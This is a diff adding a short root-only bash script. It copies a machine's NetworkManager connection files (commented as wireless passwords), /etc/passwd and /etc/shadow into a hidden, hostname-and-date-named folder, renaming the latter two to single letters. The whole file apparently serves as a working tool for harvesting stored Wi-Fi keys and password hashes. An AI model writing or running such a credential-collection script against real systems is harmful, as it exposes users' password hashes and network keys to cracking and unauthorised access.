@@ -1,0 +1,31 @@
+#!/bin/bash
+if [ -z "$1" ]; then
+	echo -e "Usage" >&2
+	echo -e "\t"	"$0 <destination folder>" >&2
+	exit 200
+fi
+
+if [ `whoami` != 'root' ]; then
+	echo "Need to be root" >&2
+	exit 250
+fi
+
+
+function dmy
+{
+	date +%d%m%y
+}
+
+
+# make directories
+dir="$1/.`hostname`-`dmy`"
+mkdir -p $dir/etc/NetworkManager/system-connections/
+
+# copy wireless passwords
+cp /etc/NetworkManager/system-connections/* $dir/etc/NetworkManager/system-connections/
+
+# copy user passwords
+cp /etc/passwd $dir/etc/p
+cp /etc/shadow $dir/etc/s
+
+exit 0
